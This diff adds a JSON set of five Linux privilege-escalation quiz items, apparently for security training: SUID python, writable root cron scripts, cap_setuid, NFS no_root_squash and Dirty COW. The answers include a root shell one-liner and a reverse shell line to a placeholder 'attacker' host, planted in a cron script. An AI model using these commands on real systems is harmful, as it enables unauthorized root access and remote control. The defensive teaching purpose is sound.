@@ -1,0 +1,47 @@
+[
+    {
+        "title": "SUID Binaries",
+        "ques": "The **SUID** (Set User ID) bit allows a binary to run with the permissions of its owner. What is the risk of a binary like `/usr/bin/python` having the SUID bit set if owned by root?",
+        "answer": {
+            "type": "text",
+            "content": "**Risk:** Any user can execute this python binary.\n\n**Exploit:** Since it runs as root, a standard user can run `python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'`.\n\n**Result:** This spawns a shell (`sh`) maintaining the root privileges (due to `-p`), giving the user a root shell instantly (GTFOBins)."
+        },
+        "explanation": "Executables that allow spawning shells should NEVER have the SUID bit set."
+    },
+    {
+        "title": "Writable Cron Jobs",
+        "ques": "You discover a Cron job that runs a shell script `/opt/backup.sh` every minute as root. The script is world-writable (`-rwxrwxrwx`). How do you exploit this?",
+        "answer": {
+            "type": "text",
+            "content": "**Exploit:**\n1. Open `/opt/backup.sh` with a text editor.\n2. Overwrite the existing code (or append to it) with a reverse shell command (e.g., `bash -i >& /dev/tcp/attacker/4444 0>&1`).\n3. Wait 60 seconds.\n\n**Result:** Cron runs your modified script as root, executing the reverse shell and connecting back to you with root access."
+        },
+        "explanation": "If you can write to the code that root executes, you become root."
+    },
+    {
+        "title": "Linux Capabilities",
+        "ques": "Linux **Capabilities** break down root privileges into smaller units. What could an attacker do if they find a python binary with the `cap_setuid+ep` capability?",
+        "answer": {
+            "type": "text",
+            "content": "**Capability:** `cap_setuid` allows the process to change its own User ID (UID).\n\n**Exploit:** The attacker runs python and executes code to call `setuid(0)` (change to root) and then spawns a shell.\n\n**Result:** Even without the SUID bit, this capability grants the specific power needed to escalate to root."
+        },
+        "explanation": "Capabilities are often overlooked. Check them with `getcap -r /`."
+    },
+    {
+        "title": "NFS No_Root_Squash",
+        "ques": "You find a network share mounted via **NFS**. The server configuration shows `(rw, no_root_squash)`. How does `no_root_squash` enable privilege escalation?",
+        "answer": {
+            "type": "text",
+            "content": "**Default (Root Squash):** Normally, if you are root on your client machine and write to the share, the server maps you to `nfsnobody` to prevent you from creating root-owned files on the server.\n\n**No Root Squash:** The server trusts the client's root user. You can copy a binary (like `bash`) to the share, set its **SUID** bit (`chmod +s`), and make it owned by root. Then, SSH into the server as a normal user and run that SUID binary to become root."
+        },
+        "explanation": "NFS trust relationships are dangerous. `no_root_squash` is effectively giving root access to any client that can mount the share."
+    },
+    {
+        "title": "Kernel Exploits (Dirty COW)",
+        "ques": "The **Dirty COW** (Copy-On-Write) vulnerability is a famous kernel exploit. What mechanism does it abuse to write to read-only files?",
+        "answer": {
+            "type": "text",
+            "content": "**Mechanism:** It exploits a race condition in the memory management of the Linux kernel's Copy-On-Write logic.\n\n**Effect:** It allows an unprivileged user to **overwrite read-only memory mappings**. An attacker can target a read-only root-owned file (like `/etc/passwd`) and overwrite it with a version containing a new root user, bypassing permissions entirely."
+        },
+        "explanation": "Kernel exploits bypass all user-space controls. They attack the very logic of the OS enforcement."
+    }
+]
